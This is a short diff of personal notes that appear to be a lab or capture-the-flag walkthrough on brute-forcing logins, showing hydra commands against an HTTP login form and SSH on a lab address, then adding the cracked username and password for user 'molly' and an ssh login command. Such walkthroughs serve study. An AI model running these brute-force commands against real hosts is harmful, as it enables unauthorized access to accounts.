@@ -78,6 +78,8 @@ hydra -l <username> -P <wordlist> 10.48.162.202 http-post-form "/:username=^USER
 ---
 EXAMPLE :
 
+
+
 ![[Pasted image 20260122192603.png]]
 
 When we enters wrong passwords it gives ==`Your username or password is incorrect`== error.
@@ -95,4 +97,11 @@ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.162.202 -t 4 ssh
 
 ![[Pasted image 20260122193619.png]]
 
+login : molly
+password  : butterfly
+
 ![[Pasted image 20260122193705.png]]
+
+```
+ssh molly@10.48.162.202 
+```
